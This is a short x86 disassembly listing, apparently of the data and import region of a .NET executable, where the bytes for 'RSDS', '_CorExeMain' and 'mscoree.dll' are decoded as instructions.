  405b97:	add    BYTE PTR [edx],al
  405b99:	add    BYTE PTR [eax],al
  405b9b:	add    BYTE PTR ds:0xa8000000,ah
  405ba1:	pop    ebx
  405ba2:	add    BYTE PTR [eax],al
  405ba4:	test   al,0x4b
  405ba6:	add    BYTE PTR [eax],al
  405ba8:	push   edx
  405ba9:	push   ebx
  405baa:	inc    esp
  405bab:	push   ebx
  405bac:	add    DWORD PTR [edx],edi
  405bae:	js     0x405b6a
  405bb0:	push   edi
  405bb1:	ds dec esi
  405bb3:	dec    ebp
  405bb4:	lods   al,BYTE PTR ds:[esi]
  405bb5:	xchg   edi,eax
  405bb6:	lods   eax,DWORD PTR ds:[esi]
  405bb7:	adc    BYTE PTR [ecx],0x9
  405bba:	sbb    BYTE PTR [esi+0x1],al
  405bbd:	add    BYTE PTR [eax],al
  405bbf:	add    BYTE PTR [ebx+esi*2+0x57],dl
  405bc3:	jo     0x405c2b
  405bc5:	push   edi
  405bc6:	jb     0x405c38
  405bc8:	cs jo  0x405c2f
  405bcb:	bound  eax,QWORD PTR [eax]
	...
  405c05:	add    BYTE PTR [eax],al
  405c07:	add    BYTE PTR [eax],dh
  405c09:	pop    esp
	...
  405c12:	add    BYTE PTR [eax],al
  405c14:	dec    esi
  405c15:	pop    esp
  405c16:	add    BYTE PTR [eax],al
  405c18:	add    BYTE PTR [eax],ah
	...
  405c2e:	add    BYTE PTR [eax],al
  405c30:	inc    eax
  405c31:	pop    esp
	...
  405c42:	pop    edi
  405c43:	inc    ebx
  405c44:	outs   dx,DWORD PTR ds:[esi]
  405c45:	jb     0x405c8c
  405c47:	js     0x405cae
  405c49:	dec    ebp
  405c4a:	popa   
  405c4b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  405c52:	jb     0x405cb9
  405c54:	gs cs fs ins BYTE PTR es:[edi],dx
  405c58:	ins    BYTE PTR es:[edi],dx
  405c59:	add    BYTE PTR [eax],al
  405c5b:	add    BYTE PTR [eax],al
  405c5d:	add    bh,bh
  405c5f:	and    eax,0x402000
